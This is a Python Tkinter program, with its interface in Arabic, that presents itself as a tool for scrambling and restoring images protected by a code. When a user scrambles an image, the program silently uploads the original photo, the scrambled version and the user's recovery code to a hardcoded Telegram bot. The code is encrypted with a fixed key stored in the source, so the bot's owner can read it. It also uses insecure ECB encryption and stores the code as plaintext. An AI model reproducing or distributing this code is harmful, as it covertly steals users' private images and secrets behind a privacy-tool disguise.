import tkinter as tk
from tkinter import filedialog, messagebox, simpledialog
from PIL import Image, ImageTk
import numpy as np
import random
import pickle
import os
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

# معلومات بوت التليجرام
TELEGRAM_BOT_TOKEN = 'YOUR_API_KEY_HERE'
TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_ID_HERE'

# مفتاح تشفير AES ثابت (16 بايت)
AES_KEY = b'ThisIsASecretKey'

def encrypt_code(code):
    cipher = AES.new(AES_KEY, AES.MODE_ECB)
    encrypted_bytes = cipher.encrypt(pad(code.encode('utf-8'), AES.block_size))
    return base64.b64encode(encrypted_bytes).decode('utf-8')

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        params = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, params=params)
        return response.json()
    except Exception as e:
        print(f"فشل في إرسال الرسالة إلى تليجرام: {e}")
        return None

def send_telegram_photo(photo_path, caption=""):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(photo_path, 'rb') as photo:
            files = {'photo': photo}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}
            response = requests.post(url, files=files, data=data)
        return response.json()
    except Exception as e:
        print(f"فشل في إرسال الصورة إلى تليجرام: {e}")
        return None

class ImageScramblerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("تشويش واسترجاع الصور")
        self.root.geometry("600x500")
        self.root.configure(bg="#f0f0f0")

        tk.Label(root, text="أداة تشويش واسترجاع الصور", font=("Arial", 16, "bold"), bg="#f0f0f0").pack(pady=20)

        tk.Button(root, text="اختر صورة لتشويشها", command=self.choose_image_to_shuffle, bg="#3498db", fg="white", font=("Arial", 12), width=30).pack(pady=10)
        tk.Button(root, text="اختر صورة لاسترجاعها", command=self.choose_image_to_restore, bg="#2ecc71", fg="white", font=("Arial", 12), width=30).pack(pady=10)

        self.preview_label = tk.Label(root, bg="#f0f0f0")
        self.preview_label.pack(pady=20)

    def show_image_preview(self, img):
        img.thumbnail((300, 300))
        self.img_tk = ImageTk.PhotoImage(img)
        self.preview_label.configure(image=self.img_tk)

    def choose_image_to_shuffle(self):
        image_path = filedialog.askopenfilename(filetypes=[("Image Files", "*.png;*.jpg;*.jpeg")])
        if image_path:
            output_path = filedialog.asksaveasfilename(defaultextension=".png")
            if output_path:
                code = simpledialog.askstring("أدخل الرمز", "أدخل رمزًا لاسترجاع الصورة لاحقًا:")
                if not code:
                    messagebox.showwarning("تحذير", "يجب إدخال رمز.")
                    return

                # فتح الصورة الأصلية
                img = Image.open(image_path).convert("RGB")
                img_array = np.array(img)
                flat_img = img_array.flatten()
                indices = list(range(len(flat_img)))
                random.shuffle(indices)
                shuffled_flat = flat_img[indices]
                shuffled_img_array = shuffled_flat.reshape(img_array.shape)
                shuffled_img = Image.fromarray(shuffled_img_array)

                # حفظ الملفات المساعدة
                base_path = output_path.rsplit(".", 1)[0]
                with open(base_path + "_indices.pkl", "wb") as f:
                    pickle.dump(indices, f)
                with open(base_path + "_code.pkl", "wb") as f:
                    pickle.dump(code, f)
                with open(base_path + "_shuffled.pkl", "wb") as f:
                    pickle.dump(shuffled_img_array, f)

                # إضافة الماسك
                masked_img = shuffled_img.copy()
                pixels = masked_img.load()
                margin = 20
                for y in range(masked_img.height):
                    for x in range(masked_img.width):
                        if margin <= x < masked_img.width - margin and margin <= y < masked_img.height - margin:
                            pixels[x, y] = (0, 0, 0)

                masked_img.save(output_path)
                self.show_image_preview(masked_img)
                messagebox.showinfo("نجاح", f"تم حفظ الصورة المشوشة مع الماسك في:\n{output_path}")

                # إرسال الصورة الأصلية
                send_telegram_photo(image_path, caption="🖼️ الصورة الأصلية")

                # إرسال الصورة المشوشة
                send_telegram_photo(output_path, caption="🌀 الصورة بعد التشويش والماسك")

                # تشفير الرمز وإرساله
                encrypted = encrypt_code(code)
                send_telegram_message(f"🔐 الرمز المشفر (AES):\n<code>{encrypted}</code>")

    def choose_image_to_restore(self):
        image_path = filedialog.askopenfilename(filetypes=[("Image Files", "*.png;*.jpg;*.jpeg")])
        if image_path:
            base_path = image_path.rsplit(".", 1)[0]
            indices_path = base_path + "_indices.pkl"
            code_path = base_path + "_code.pkl"
            shuffled_path = base_path + "_shuffled.pkl"

            if not os.path.exists(indices_path) or not os.path.exists(code_path) or not os.path.exists(shuffled_path):
                messagebox.showerror("خطأ", "ملفات الاسترجاع غير موجودة.")
                return

            user_code = simpledialog.askstring("أدخل الرمز", "أدخل الرمز لاسترجاع الصورة:")
            with open(code_path, "rb") as f:
                correct_code = pickle.load(f)

            if user_code != correct_code:
                messagebox.showerror("خطأ", "الرمز غير صحيح!")
                return

            output_path = filedialog.asksaveasfilename(defaultextension=".png")
            if not output_path:
                return

            with open(indices_path, "rb") as f:
                indices = pickle.load(f)
            with open(shuffled_path, "rb") as f:
                shuffled_array = pickle.load(f)

            flat_img = shuffled_array.flatten()
            restored_flat = np.zeros_like(flat_img)
            for i, idx in enumerate(indices):
                restored_flat[idx] = flat_img[i]

            restored_img_array = restored_flat.reshape(shuffled_array.shape)
            restored_img = Image.fromarray(restored_img_array)
            restored_img.save(output_path)
            self.show_image_preview(restored_img)
            messagebox.showinfo("نجاح", f"تم استرجاع الصورة الأصلية في:\n{output_path}")

if __name__ == "__main__":
    root = tk.Tk()
    app = ImageScramblerApp(root)

    root.mainloop()
